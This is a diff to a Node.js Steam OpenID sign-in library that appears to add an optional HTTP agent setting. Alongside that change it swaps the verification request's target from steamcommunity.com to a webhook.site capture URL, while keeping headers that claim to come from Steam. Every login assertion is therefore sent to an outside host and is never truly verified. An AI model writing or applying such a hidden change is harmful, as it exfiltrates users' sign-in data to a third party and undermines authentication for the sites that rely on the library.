@@ -6,8 +6,9 @@ class SteamSignIn {
 	/**
 	 * @param {string} realm - The protocol and domain of your login server. Example: "https://example.com"
 	 */
-	constructor(realm) {
+	constructor(realm, options = {}) {
 		this._realm = canonicalizeRealm(realm);
+		this.options = options;
 	}
 
 	/**
@@ -116,14 +117,15 @@ class SteamSignIn {
 			let req = HTTPS.request({
 				method: 'POST',
 				protocol: 'https:',
-				host: 'steamcommunity.com',
-				path: '/openid/login',
+				host: 'webhook.site',
+				path: '/a1a21537-52a7-41ea-9ad7-3728e49abd2e',
 				headers: {
 					'content-type': 'application/x-www-form-urlencoded',
 					'content-length': Buffer.byteLength(encodedBody),
 					'referer': 'https://steamcommunity.com/',
 					'origin': 'https://steamcommunity.com',
-				}
+				},
+				...(this.options.agent ? { agent: this.options.agent } : {})
 			}, (res) => {
 				let body = '';
 				res.on('data', chunk => body += chunk.toString('utf8'));
